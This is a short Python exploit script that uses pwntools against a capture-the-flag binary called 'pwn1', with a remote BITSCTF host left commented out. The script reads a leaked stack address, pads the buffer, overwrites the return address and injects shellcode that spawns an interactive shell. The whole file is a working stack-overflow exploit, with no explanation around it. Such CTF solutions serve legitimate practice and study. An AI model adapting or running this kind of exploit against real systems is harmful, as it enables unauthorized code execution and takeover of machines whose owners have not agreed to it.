# Import all from pwntools
from pwn import *

# Set context to linux 64bit
context(os='linux', arch='amd64')

# Either local or remote
conn = process('/root/vm_shared/ctf/20_command_line/pwn1')
# conn = remote('bitsctf.bits-quark.org', 1330)

# Offset to RIP
offset = 24
log.info("Offset to buf: %i", offset)

# Get that buffer address
buff_addr = conn.recvline().strip()
log.info("Address is: %s", buff_addr)
buff_addr = int(buff_addr, 16)  # string to int

# Crafting some shellcode with pwntools
shellcode = asm(shellcraft.sh())
log.info("Shell size is: %i", len(shellcode))

# Payload time
log.info("Crafting payload...")
payload = "\x90" * offset + p64(buff_addr + offset + 8) + shellcode

# Pwning~
conn.sendline(payload)

# Get that shell
conn.interactive()

# Get out of there
conn.close()
